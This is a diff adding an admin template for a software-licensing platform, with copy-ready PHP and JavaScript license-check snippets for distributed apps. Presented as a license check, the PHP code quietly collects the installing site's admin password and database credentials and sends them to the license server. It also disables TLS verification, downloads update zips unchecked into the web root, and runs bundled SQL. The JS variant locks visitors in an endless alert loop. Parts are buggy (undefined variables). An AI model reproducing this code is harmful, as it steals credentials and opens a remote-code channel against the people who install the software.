@@ -1,0 +1,1527 @@
+{include file="/public/header"}
+<!-- 正文开始 -->
+<div class="layui-fluid">
+    <div class="layui-card">
+        <div class="layui-card-body">
+            <!-- 表格工具栏 -->
+            <form class="layui-form toolbar">
+                <div class="layui-form-item">
+                    <div class="layui-inline">
+                        <label class="layui-form-label">内&emsp;容</label>
+                        <div class="layui-input-inline">
+                            <input name="text" class="layui-input" placeholder="输入ID或应用名称"/>
+                        </div>
+                    </div>
+                    <div class="layui-inline">
+                        <label class="layui-form-label">状&emsp;态</label>
+                        <div class="layui-input-inline">
+                            <select name="status" class="ew-select-fixed">
+                                <option value="">选择状态</option>
+                                <option value="2">运营中</option>
+                                <option value="1">维护中</option>
+                                <option value="0">已停止</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="layui-inline layui-btn-container">&emsp;&emsp;
+                        <button class="layui-btn icon-btn" lay-filter="SF_TbSearch" lay-submit>
+                            <i class="layui-icon">&#xe615;</i>搜索
+                        </button>
+                    </div>
+                </div>
+            </form>
+            <!-- 数据表格 -->
+
+            <table id="SF_Table" lay-filter="SF_Table"></table>
+        </div>
+    </div>
+</div>
+<!-- 表格操作列 -->
+<script type="text/html" id="SF_TbBar">
+    <a class="layui-btn layui-btn-normal layui-btn-sm" lay-event="code"><i class="layui-icon layui-icon-senior"></i>代码</a>
+    <a class="layui-btn layui-btn-primary layui-btn-sm" lay-event="edit"><i class="layui-icon layui-icon-edit"></i>修改</a>
+    <a class="layui-btn layui-btn-danger layui-btn-sm" lay-event="del"><i class="layui-icon layui-icon-delete"></i>删除</a>
+</script>
+<!-- 表格状态列 -->
+<script type="text/html" id="SF_TbState">
+    <input type="checkbox" lay-filter="SF_TbStateCk" value="{{d.id}}" lay-skin="switch"
+           lay-text="运营|维护" {{d.status==2?'checked':''}} style="display: none;"/>
+</script>
+<script type="text/html" id="SF_TbState2">
+    <input type="checkbox" lay-filter="SF_TbStateCk2" value="{{d.id}}" lay-skin="switch"
+           lay-text="停止|正常" {{d.status==0?'checked':''}} style="display: none;"/>
+</script>
+<script type="text/html" id="SF_CodeDialog">
+    <div class="layui-tab layui-tab-brief">
+        <ul class="layui-tab-title">
+            <li class="layui-this">PHP（类版本）</li>
+            <li>PHP</li>
+            <li>JS</li>
+        </ul>
+        <div class="layui-tab-content">
+            <div class="layui-tab-item layui-show">
+  <pre class="layui-code authclass"><button type="button" data-clipboard-target=".authclass" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权类（请配置好授权后加密该类，并用md5_file判断加密后文件）
+class Authorization{
+    /**
+    * 信息配置
+    * @author 陌上花开
+    */
+    // 填写授权站域名
+    const AUTH_DOMAIN = '{:DOMAIN}';
+    // 填写本应用API的密钥
+    const APP_API_KEY = '<span class="api_key"></span>';
+    // 填写本应用ID
+    const APPID = '<span class="appid"></span>';
+    // 填写提交方式 get或post
+    const METHOD = '<span class="method"></span>';
+    // 填写授权站是否为https true为https，false为http
+    const IS_HTTPS = {:is_https()? "true" : "false"};
+    // 授权缓存时间(单位/秒)
+    const TIME = 86400;
+    // 队列查询最长等待时间
+    const QUEUE_TIME = 60;
+    // 缓存名称
+    const SESSION_NAME = 'SF_CheckAuthResult';
+    // 盗版提示
+    private static function message($msg = ''){
+        // 自定义盗版提示HTML代码
+        $html = '&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;title&gt;站点提示信息&lt;/title&gt;&lt;style&gt;html{background:#eee}body{background:#fff;color:#333;font-family:&quot;微软雅黑&quot;,&quot;Microsoft YaHei&quot;,sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}&lt;/style&gt;&lt;body id=&quot;error-page&quot;&gt;&lt;h3&gt;站点提示信息&lt;/h3&gt;&#x27;.$msg.&#x27;&lt;/body&gt;&lt;/html&gt;';
+        exit($html);
+    }
+    // 检测授权
+    public static function main(){
+        $SF_CheckAuthResult = self::getSession();
+        if(!empty($SF_CheckAuthResult)){
+            $result = $SF_CheckAuthResult;
+            if(is_array($result)){
+                if(self::verifySign(json_encode($result['data']['data']), $result['data']['sign'])){
+                    if(($result['data']['data']['time'] + self::TIME) > time()){
+                        if($result['data']['data']['code'] != 0){
+                            self::deleteSession();
+                            self::message($result['msg']);
+                        }
+                    }else{
+                        self::deleteSession();
+                    }
+                }else{
+                    self::deleteSession();
+                    self::message('签名验证失败，请刷新后重试~');
+                }
+            }else{
+                self::deleteSession();
+                self::message('链接服务器失败');
+            }
+        }else{
+            $result = self::checkInfo();
+            if(!$result){
+                self::message('链接服务器失败');
+            }else{
+                if($result['data']['data']['code'] == 0) {
+                    self::setSession($result);
+                }else if($result['data']['data']['code'] == 1){
+                    // 此处为关闭盗版提示部分，若该应用关闭盗版提示则可在此填入自定义的代码，可留空
+                }else{
+                    self::message($result['msg']);
+                }
+            }
+        }
+    }
+    // 在线更新
+    public static function updateMain($SF_Action = 'check'){
+        $result = self::checkInfo('update');
+        switch ($SF_Action) {
+            case 'check':
+                // 如果链接服务器失败
+                if(!$result){
+                    $data = [
+                        'code' => -1,
+                        'msg' => '啊哦，更新服务器开小差了，请刷新此页面。'
+                    ];
+                    return $data;
+                }else{
+                    return $result;
+                }
+            case 'update':
+                // 授权站下载更新包网址
+                $downloadUrl = $result['data']['data']['data']['url'];
+                // 下载到本地的压缩包名称
+                $ZipFile = 'SF.zip';
+                // 循环需要更新的版本
+                foreach ($result['data']['data']['data']['download'] as $res){
+                    // 模拟用户
+                    ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;)');
+                    // 若下载更新包失败
+                    if(!copy($downloadUrl.$res, $ZipFile)){
+                        $data = [
+                            'code' => -1,
+                            'msg' => '无法下载更新包文件！'
+                        ];
+                        return $data;
+                    }
+                    $addstr = '';
+                    // 若解压到根目录成功
+                    if (self::zipExtract($ZipFile, ROOT)) {
+                        if(function_exists("opcache_reset"))@opcache_reset();
+                        $sqlFile = ROOT.'update.sql';
+                        // 检测是否存在update.sql
+                        if(is_file($sqlFile)){
+                            $sql = file_get_contents($sqlFile);
+                            $t=0; $e=0; $error='';
+                            for($i=0;$i < count($sql);$i++) {
+                                if (trim($sql[$i])=='')continue;
+                                if($DB->exec($sql[$i])!==false) {
+                                    ++$t;
+                                } else {
+                                    ++$e;
+                                    $error.=$DB->error().'<br/>';
+                                }
+                            }
+                            @unlink($sqlFile);
+                            $addstr = '<br/>数据库更新成功。SQL成功'.$t.'句/失败'.$e.'句';
+                        }
+                        @unlink($ZipFile);
+                        $data = [
+                            'code' => 0,
+                            'msg' => '更新包解压成功'.$addstr
+                        ];
+                        return $data;
+                    }else {
+                        if (file_exists($ZipFile))
+                            @unlink($ZipFile);
+                        $data = [
+                            'code' => -1,
+                            'msg' => '解压更新包失败，请稍后重试'
+                        ];
+                        return $data;
+                    }
+                }
+                // 全部版本更新完成
+                $data = [
+                    'code' => 1,
+                    'msg' => '已更新至最新版本'
+                ];
+                return $data;
+            default:
+                $data = [
+                    'code' => -1,
+                    'msg' => '请求类型错误！'
+                ];
+                return $data;
+        }
+    }
+    // 盗版入库不部分，根据自己情况适当更改
+    private static function getParam(){
+        global $conf,$dbconfig;
+        if(!class_exists('AuthInfo')){
+            self::message('缺少授权信息类！');
+        }
+        return ['authcode'=> AuthInfo::AUTHCODE, 'version' => AuthInfo::VERSION, '用户名' => $conf['admin_user'], '密码' => $conf['admin_pwd'], 'qq' => $conf['kfqq'], '数据库用户名' => $dbconfig['user'], '数据库密码' => $dbconfig['pwd'], '数据库库名' => $dbconfig['dbname']];
+    }
+    private static function checkInfo($type = 'auth'){
+        switch ($type) {
+            case 'update':
+                $method = 'checkUpdate';
+                break;
+            default:
+                $method = 'checkAuth';
+                break;
+        }
+        $data = ['auth_info' => getenv('HTTP_HOST'), 'appid' => self::APPID, 'api_key' => self::APP_API_KEY, 'param' => base64_encode(json_encode(self::getParam()))];
+        $is_https = (!self::IS_HTTPS)?'http://':'https://';
+        $result = self::curl_request($is_https.self::AUTH_DOMAIN.'/api.php/Auth/'.$method, $data ,self::METHOD ,self::IS_HTTPS);
+        //exit(print_r($result));
+        $result = json_decode($result, true);
+        if(is_array($result)){
+            if(array_key_exists('queue',$result['data'])){
+                $i = 0;
+                while (1){
+                    $result = self::curl_request($http.self::AUTH_DOMAIN.'/api.php/Auth/queueCheck', $data ,self::METHOD ,self::IS_HTTPS);
+                    $result = json_decode($result, true);
+                    if(is_array($result)) {
+                        if (array_key_exists('queue',$result['data'])) {
+                            $i++;
+                            if($i > self::QUEUE_TIME){
+                                return false;
+                            }
+                        } else {
+                            return $result;
+                        }
+                    } else {
+                        return false;
+                    }
+                    sleep(1);
+                }
+            } else {
+                return $result;
+            }
+        }
+        return false;
+    }
+    // 公钥验签
+    private static function verifySign($data, $sign) {
+        if(!class_exists('AuthInfo')) self::message('缺少授权信息类！');
+        $publicKey = AuthInfo::PUBLIC_KEY;
+        if(empty($publicKey)) self::message('缺少公玥，请重新到&lt;a href=&quot;'.((!self::IS_HTTPS)?'http://':'https://').self::AUTH_DOMAIN.'&quot;&gt;授权站下载源码！');
+        return (1 == openssl_verify($data, self::urlSafeBase64decode($sign), $publicKey, OPENSSL_ALGO_SHA256));
+    }
+    private static function urlSafeBase64decode($string){
+        $data = str_replace(array('-','_'), array('+','/'), $string);
+        $mod4 = strlen($data) % 4;
+        if($mod4){
+            $data .= substr('====', $mod4);
+        }
+        return base64_decode($data);
+    }
+    // 解压函数
+    private static function zipExtract($filePath, $topath){
+        if (empty($topath) || empty($filePath)) {
+            return false;
+        }
+        $zip = new \ZipArchive();
+        if ($zip->open($filePath) === true) {
+            if(true){
+                for($i = 0; $i < $zip->numFiles; $i++) {
+                    $filename = $zip->getNameIndex($i);
+                    $t = explode('.',$filename);
+                    if(count($t) == 2){
+                        if(is_file($topath.'/'.$filename)){
+                            @unlink($topath.'/'.$filename);
+                        }
+                        $s = $zip->getStream($filename);
+                        $data = stream_get_contents($s);
+                        file_put_contents($topath.'/'.$filename, $data);
+                    }else{
+                        @mkdir($topath.'/'.$filename, 0777);
+                    }
+                }
+            }
+            $zip->close();
+            return true;
+        } else {
+            return false;
+        }
+    }
+    // 获取SESSION
+    private static function getSession(){
+        return !empty($_SESSION[self::SESSION_NAME])?$_SESSION[self::SESSION_NAME]:null;
+    }
+    // 设置SESSION
+    private static function setSession($session = null){
+        $_SESSION[self::SESSION_NAME] = $session;
+    }
+    // 删除SESSION
+    private static function deleteSession(){
+        unset($_SESSION[self::SESSION_NAME]);
+    }
+    // CURL请求
+    private static function curl_request($url, $data = [], $type = 'post', $https = false){
+        // 初始化
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+        // 设置超时时间
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        // 是否要求返回数据
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        if ($https) {
+            // 对认证证书来源的检查
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            // 从证书中检查SSL加密算法是否存在
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        }
+        if (strtolower($type) == 'post') {
+            // 设置post方式提交
+            curl_setopt($ch, CURLOPT_POST, true);
+            // 提交的数据
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        } elseif (!empty($data) && is_array($data)) {
+            // get网络请求
+            $url = $url . '?' . http_build_query($data);
+        }
+        // 设置抓取的url
+        curl_setopt($ch, CURLOPT_URL, $url);
+        // 执行命令
+        $result = curl_exec($ch);
+        if ($result === false) {
+            return false;
+        }
+        // 关闭URL请求(释放句柄)
+        curl_close($ch);
+        return $result;
+    }
+}</pre>
+                <pre class="layui-code update"><button type="button" data-clipboard-target=".update" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 在线更新接口代码
+$SF_Action = isset($_POST['SF_Action']) ? $_POST['SF_Action'] : null;
+if(!empty($SF_Action)){
+    // 调用检测更新方法
+    $result = Authorization::updateMain($SF_Action);
+    exit(json_encode($result));
+}
+</pre>
+                <pre class="layui-code authcode"><button type="button" data-clipboard-target=".authcode" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权代码
+define('SF_ROOT', dirname(__FILE__).'/');
+include(SF_ROOT . 'AuthInfo.php');
+include(SF_ROOT . 'Authorization.php');
+session_start();
+if(md5_file(SF_ROOT . 'Authorization.php') === '该文件md5值'){
+    Authorization::main();
+}else{
+    exit('系统文件已损坏，请到授权站重新下载源码');
+}</pre>
+
+                <pre class="layui-code authinfo"><button type="button" data-clipboard-target=".authinfo" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权信息类
+class AuthInfo{
+    const AUTHCODE = '60d31eb37595dd44584be5ef363283e3';
+    const VERSION = 1000;
+    const EDITION = '1.0';
+    const PUBLIC_KEY = '<span class="public_key"></span>';
+}
+</pre>
+            </div>
+            <div class="layui-tab-item">
+  <pre class="layui-code authcode2"><button type="button" data-clipboard-target=".authcode2" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权代码
+session_start();
+// 你的授权站域名
+define('AUTH_DOMAIN','{:DOMAIN}');
+// 本应用的API密钥
+define('APP_API_KEY', '<span class="api_key"></span>');
+// 填写应用ID
+define('APPID', '<span class="appid"></span>');
+// 填写提交方式 get或post
+define('METHOD', '<span class="method"></span>');
+// 填写授权站是否为https true为https，false为http
+define('IS_HTTPS', {:is_https()? "true" : "false"});
+// 授权缓存时间(单位/秒)
+define('TIME', 86400);
+// 队列查询最长等待时间
+define('QUEUE_TIME', 60);
+// 缓存名称
+define('SESSION_NAME','SF_CheckAuthResult');
+define('SF_ROOT', dirname(__FILE__).'/');
+include(SF_ROOT . 'AuthInfo.php');
+
+function verifySign($data, $sign){
+    if(!class_exists('AuthInfo')){
+        exit('缺少授权信息类！');
+    }
+    $publicKey = AuthInfo::PUBLIC_KEY;
+    if(empty($publicKey)) exit('缺少公玥，请重新到&lt;a href=&quot;'.((!IS_HTTPS)?'http://':'https://').AUTH_DOMAIN.'&quot;&gt;授权站下载源码！');
+    $sign = str_replace(array('-','_'), array('+','/'), $sign);
+    $mod4 = strlen($sign) % 4;
+    if($mod4){
+        $sign .= substr('====', $mod4);
+    }
+    $sign = base64_decode($sign);
+    return (1 == openssl_verify($data, $sign, $publicKey, OPENSSL_ALGO_SHA256));
+}
+
+function curl_request($url, $data = [], $type = 'post', $https = false){
+    // 初始化
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+    // 设置超时时间
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    // 是否要求返回数据
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    if ($https) {
+        // 对认证证书来源的检查
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        // 从证书中检查SSL加密算法是否存在
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    }
+    if (strtolower($type) == 'post') {
+        // 设置post方式提交
+        curl_setopt($ch, CURLOPT_POST, true);
+        // 提交的数据
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    } elseif (!empty($data) && is_array($data)) {
+        // get网络请求
+        $url = $url . '?' . http_build_query($data);
+    }
+    // 设置抓取的url
+    curl_setopt($ch, CURLOPT_URL, $url);
+    // 执行命令
+    $result = curl_exec($ch);
+    if ($result === false) {
+        return false;
+    }
+    // 关闭URL请求(释放句柄)
+    curl_close($ch);
+    return $result;
+}
+
+function checkInfo($type = 'auth'){
+    global $conf,$dbconfig;
+    switch ($type) {
+        case 'update':
+            $method = 'checkUpdate';
+            break;
+        default:
+            $method = 'checkAuth';
+            break;
+    }
+    $data = ['auth_info' => getenv('HTTP_HOST'), 'appid' => APPID, 'api_key' => APP_API_KEY, 'param' => base64_encode(json_encode(['authcode'=> AuthInfo::AUTHCODE, 'version' => AuthInfo::VERSION, '用户名' => $conf['admin_user'], '密码' => $conf['admin_pwd'], 'qq' => $conf['kfqq'], '数据库用户名' => $dbconfig['user'], '数据库密码' => $dbconfig['pwd'], '数据库库名' => $dbconfig['dbname']]))];
+    $http = (!IS_HTTPS)?'http://':'https://';
+    $result = curl_request($http.AUTH_DOMAIN.'/api.php/Auth/'.$method, $data ,METHOD ,IS_HTTPS);
+    $result = json_decode($result, true);
+    if(is_array($result)){
+        if(array_key_exists('queue',$result['data'])){
+            $i = 0;
+            while (1){
+                $result = curl_request($http.AUTH_DOMAIN.'/api.php/Auth/queueCheck', $data ,METHOD ,IS_HTTPS);
+                $result = json_decode($result, true);
+                if(is_array($result)) {
+                    if (array_key_exists('queue',$result['data'])) {
+                        $i++;
+                        if($i > QUEUE_TIME){
+                            return false;
+                        }
+                    } else {
+                        return $result;
+                    }
+                } else {
+                    return false;
+                }
+                sleep(1);
+            }
+        } else {
+            return $result;
+        }
+    }
+    return false;
+}
+
+if(!empty($_SESSION[SESSION_NAME])){
+    $result = $_SESSION[SESSION_NAME];
+    if(is_array($result)){
+        if(verifySign(json_encode($result['data']['data']), $result['data']['sign'])){
+            if(($result['data']['data']['time'] + TIME) > time()){
+                if($result['data']['data']['code'] != 0){
+                    unset($_SESSION[SESSION_NAME]);
+                    exit($result['msg']);
+                }
+            }else{
+                unset($_SESSION[SESSION_NAME]);
+            }
+        }else{
+            unset($_SESSION[SESSION_NAME]);
+            exit('签名验证失败，请刷新后重试~');
+        }
+    }else{
+        unset($_SESSION[SESSION_NAME]);
+        exit('链接服务器失败');
+    }
+}else{
+    $result = checkInfo();
+    if(!$result){
+        exit('链接服务器失败');
+    }else{
+        if($result['data']['data']['code'] == 0) {
+            $_SESSION[SESSION_NAME] = $result;
+        }else if($result['data']['data']['code'] == 1){
+            // 此处为关闭盗版提示部分，若该应用关闭盗版提示则可在此填入自定义的代码，可留空
+        }else{
+            exit($result['msg']);
+        }
+    }
+}
+</pre>
+                <pre class="layui-code update2"><button type="button" data-clipboard-target=".update2" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 在线更新代码
+$SF_Action = isset($_POST['SF_Action']) ? $_POST['SF_Action'] : null;
+if(!empty($SF_Action)){
+    // 调用检测更新方法
+    function updateMain($SF_Action = 'check'){
+        $result = checkInfo('update');
+        switch ($SF_Action) {
+            case 'check':
+                // 如果链接服务器失败
+                if(!$result){
+                    $data = [
+                        'code' => -1,
+                        'msg' => '啊哦，更新服务器开小差了，请刷新此页面。'
+                    ];
+                    return $data;
+                }else{
+                    return $result;
+                }
+            case 'update':
+                // 授权站下载更新包网址
+                $downloadUrl = $result['data']['data']['url'];
+                // 下载到本地的压缩包名称
+                $ZipFile = 'SF.zip';
+                // 循环需要更新的版本
+                foreach ($result['data']['data']['download'] as $res){
+                    // 模拟用户
+                    ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;)');
+                    // 若下载更新包失败
+                    if(!copy($downloadUrl.$res, $ZipFile)){
+                        $data = [
+                            'code' => -1,
+                            'msg' => '无法下载更新包文件！'
+                        ];
+                        return $data;
+                    }
+                    $addstr = '';
+                    // 若解压到根目录成功
+                    if (zipExtract($ZipFile, ROOT)) {
+                        if(function_exists("opcache_reset"))@opcache_reset();
+                        $sqlFile = ROOT.'update.sql';
+                        // 检测是否存在update.sql
+                        if(is_file($sqlFile)){
+                            $sql = file_get_contents($sqlFile);
+                            $t=0; $e=0; $error='';
+                            for($i=0;$i < count($sql);$i++) {
+                                if (trim($sql[$i])=='')continue;
+                                if($DB->exec($sql[$i])!==false) {
+                                    ++$t;
+                                } else {
+                                    ++$e;
+                                    $error.=$DB->error().'<br/>';
+                                }
+                            }
+                            @unlink($sqlFile);
+                            $addstr = '<br/>数据库更新成功。SQL成功'.$t.'句/失败'.$e.'句';
+                        }
+                        @unlink($ZipFile);
+                        $data = [
+                            'code' => 0,
+                            'msg' => '更新包解压成功'.$addstr
+                        ];
+                        return $data;
+                    }else {
+                        if (file_exists($ZipFile))
+                            @unlink($ZipFile);
+                        $data = [
+                            'code' => -1,
+                            'msg' => '解压更新包失败，请稍后重试'
+                        ];
+                        return $data;
+                    }
+                }
+                // 全部版本更新完成
+                $data = [
+                    'code' => 1,
+                    'msg' => '已更新至最新版本'
+                ];
+                return $data;
+            default:
+                $data = [
+                    'code' => -1,
+                    'msg' => '请求类型错误！'
+                ];
+                return $data;
+        }
+    }
+}
+</pre>
+                <pre class="layui-code authinfo2"><button type="button" data-clipboard-target=".authinfo2" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权信息类
+class AuthInfo{
+    const AUTHCODE = '60d31eb37595dd44584be5ef363283e3';
+    const VERSION = 1000;
+    const EDITION = '1.0';
+    const PUBLIC_KEY = '<span class="public_key"></span>';
+}
+</pre>
+            </div>
+            <div class="layui-tab-item">
+  <pre class="layui-code authcode3"><button type="button" data-clipboard-target=".authcode3" class="pull-right layui-btn layui-btn-xs btnCopy">复制</button>// 授权代码
+&lt;script src=&quot;//cdn.bootcdn.net/ajax/libs/jsrsasign/10.6.1/jsrsasign-all-min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+//====配置信息开始====//
+// 你的授权站域名
+var AUTH_DOMAIN = '{:DOMAIN}';
+// 填写应用ID
+var APPID = '<span class="appid"></span>';
+// 本应用的API密钥
+var APP_API_KEY = '<span class="api_key"></span>';
+// 填写提交方式 get或post
+var METHOD = '<span class="method"></span>';
+// 填写授权站是否为https true为https，false为http
+var IS_HTTPS = {:is_https()? "true" : "false"};
+// 授权缓存时间(单位/秒)
+var TIME = 86400;
+// 队列查询最长等待时间
+var QUEUE_TIME = 60;
+// 缓存名称
+var SESSION_NAME = 'SF_CheckAuthResult';
+// 公玥
+var PUBLIC_KEY = <span class="js_public_key"></span>;
+//====配置信息结束====//
+//====自定义ajax函数开始====//
+var sfAjax={ajax:function(e){if((e=e||{}).cache=e.cache||!1,!e.url)throw new Error(&quot;参数不合法&quot;);e.dataType=(e.dataType||&quot;json&quot;).toLowerCase(),&quot;jsonp&quot;==e.dataType?this.ajaxJSONP(e):&quot;json&quot;==e.dataType&amp;&amp;this.ajaxJSON(e)},ajaxJSONP(e){e.data=e.data||{},e.jsonp=e.jsonp||&quot;callback&quot;;var t=&quot;jsonp_&quot;+(new Date).getTime();e.data[e.jsonp]=t;var a=this.formateParams(e.data,e.cache),s=document.getElementsByTagName(&quot;head&quot;)[0],r=document.createElement(&quot;script&quot;);s.appendChild(r),window[t]=function(a){s.removeChild(r),clearTimeout(r.timer),window[t]=null,e.success&amp;&amp;e.success(a)},r.src=a?e.url+&quot;?&quot;+a:e.url,e.time&amp;&amp;(r.timer=setTimeout(function(){window[t]=null,s.removeChild(r),e.error&amp;&amp;e.error({message:&quot;超时&quot;})},e.time))},ajaxJSON(e){e.type=(e.type||&quot;GET&quot;).toUpperCase(),e.data=e.data||{};var t,a=this.formateParams(e.data,e.cache);(t=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)).onreadystatechange=function(){4==t.readyState&amp;&amp;200==t.status?e.success&amp;&amp;(&quot;string&quot;==typeof t.responseText?e.success(JSON.parse(t.responseText)):e.success(t.responseText)):e.error&amp;&amp;e.error(status)},&quot;GET&quot;==e.type?(t.open(&quot;GET&quot;,a?e.url+&quot;?&quot;+a:e.url,!0),t.send(null)):(t.open(&quot;POST&quot;,e.url,!0),t.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;),t.send(a))},formateParams:function(e,t){var a=[];for(var s in e)a.push(encodeURIComponent(s)+&quot;=&quot;+encodeURIComponent(e[s]));return t&amp;&amp;a.push(&quot;v=&quot;+(new Date).getTime()),a.join(&quot;&amp;&quot;)}};
+//====自定义ajax函数结束====//
+// 自定义提示信息函数
+function message(msg = &#x27;&#x27;){
+    // 写入HTML代码
+    //document.write(&#x27;&lt;h1&gt;&#x27;+msg+&#x27;&lt;/h1&gt;&#x27;);
+    // 无限弹窗
+    while(true){
+        alert(msg);
+        // 跳转，可自定义跳转链接
+        window.location.href = (IS_HTTPS?&#x27;https://&#x27;:&#x27;http://&#x27;) + AUTH_DOMAIN;
+    }
+}
+let session = sessionStorage.getItem(SESSION_NAME)?JSON.parse(sessionStorage.getItem(SESSION_NAME)):{};
+if(Object.keys(session).length > 0){
+    if(typeof(Object.keys(session).length) == 'undefined' || JSON.stringify(session) == '{}'){
+        sessionStorage.removeItem(SESSION_NAME);
+        message('链接服务器失败');
+    }else{
+        // 验签
+        // !要重新new 一个Signature, 否则, 取摘要和签名时取得摘要不一样, 导致验签误报失败(原因不明)!
+        let signatureVf = new KJUR.crypto.Signature({alg:"SHA256withRSA",prvkeypem:PUBLIC_KEY});
+        signatureVf.updateString(JSON.stringify(session.data.data));
+        // !接受的参数是16进制字符串!
+        let verify = signatureVf.verify(b64utohex(session.data.sign));
+        if(verify === true){
+            if((session.data.data.time + TIME) > Math.floor(Date.now() / 1000)){
+                if(session.data.data.code != 0){
+                    sessionStorage.removeItem(SESSION_NAME);
+                    message(session.msg);
+                }
+            }else{
+                sessionStorage.removeItem(SESSION_NAME);
+            }
+        }else{
+            sessionStorage.removeItem(SESSION_NAME);
+            message('签名验证失败，请刷新后重试~');
+        }
+    }
+}else{
+    sfAjax.ajax({
+        url: (IS_HTTPS?&#x27;https://&#x27;:&#x27;http://&#x27;)+AUTH_DOMAIN+&#x27;/api.php/Auth/checkAuth&#x27;,
+        type: METHOD, //or post
+        dataType: &#x27;json&#x27;, //or jsonp
+        data: {
+            auth_info: window.location.host,
+            appid: APPID,
+            api_key: APP_API_KEY,
+        },
+        success: function(result) {
+            if(!result || typeof(Object.keys(result).length) == &#x27;undefined&#x27; || JSON.stringify(result) == &#x27;{}&#x27;){
+                message(&#x27;链接服务器失败&#x27;);
+            }else{
+                if(result.data.data.code == 0) {
+                    sessionStorage.setItem(SESSION_NAME,JSON.stringify(result));
+                }else if(result.data.data.code == 1){
+                    // 此处为关闭盗版提示部分，若该应用关闭盗版提示则可在此填入自定义的代码，可留空
+                }else{
+                    message(result.msg);
+                }
+            }
+        }
+    });
+}
+&lt;/script&gt;
+</pre>
+            </div>
+        </div>
+    </div>
+
+</script>
+<script type="text/html" id="SF_EditDialog">
+    <form class="layui-form model-form no-padding text-center" style="max-width: 700px;margin: 30px auto;" lay-filter="formBasForm">
+        <input name="id" type="hidden"/>
+        <div class="layui-tab layui-tab-brief" lay-filter="docDemoTabBrief">
+            <ul class="layui-tab-title">
+                <li class="layui-this">应用配置</li>
+                <li>系统配置</li>
+                <li>价格配置</li>
+                <li>授权配置</li>
+                <li>盗版配置</li>
+                <li>公告配置</li>
+            </ul>
+            <div class="layui-tab-content">
+                <div class="layui-tab-item layui-show">
+                    <div class="layui-form-item">
+                        <label class="layui-form-label" style="height: 32px;border-radius: 4px;">应用名称</label>
+                        <div class="layui-input-block">
+                            <input type="text" style="border-radius: 0px 4px 4px 0px;" name="name" class="layui-input" placeholder="应用的名称"/>
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <label class="layui-form-label">应用LOGO</label>
+                        <div class="layui-input-block">
+                            <input type="text" class="layui-input" name="logo" placeholder="填写图片URL，没有默认为系统LOGO">
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <div class="layui-input-block">
+                            <div class="layui-upload-drag" id="upload">
+                                <i class="layui-icon layui-icon-upload-drag" style="color:#2d8cf0;"></i>
+                                <p>点击上传，或将文件拖拽到此处</p>
+                                <div class="layui-hide" id="uploadDemoView">
+                                    <hr>
+                                    <img src="" alt="上传成功后渲染" id="demo1" style="max-width: 196px">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="layui-form-item layui-form-text">
+                        <label class="layui-form-label">应用简介</label>
+                        <div class="layui-input-block">
+                            <textarea name="introduce" class="layui-textarea" style="height:100px" placeholder="该应用的简单介绍,可留空"></textarea>
+                        </div>
+                    </div>
+                    <div class="layui-form-item">
+                        <label class="layui-form-label">判断规则</label>
+                        <div class="layui-input-block">
+                            <select class="layui-input" name="check_type" lay-filter="check_type" lay-search>
+                                <option value="">请选择判断规则</option>
+                                {volist name="check_type_list" id="res"}
+                                <option value="{$res.type}">{$res.name}</option>
+                                {/volist}
+                            </select>
+                        </div>
+                    </div>
+                    <div class="layui-form-item" pane>
+                        <label class="layui-form-label">应用状态</label>
+                        <div class="layui-input-block">
+                            <input type="radio" name="status" value="2" title="正常运营" checked>
+                            <input type="radio" name="status" value="1" title="系统维护">
+                            <input type="radio" name="status" value="0" title="停止运营">
+                        </div>
+                    </div>
+                </div>
+                <div class="layui-tab-item">
+                    <div class="layui-form-item" pane>
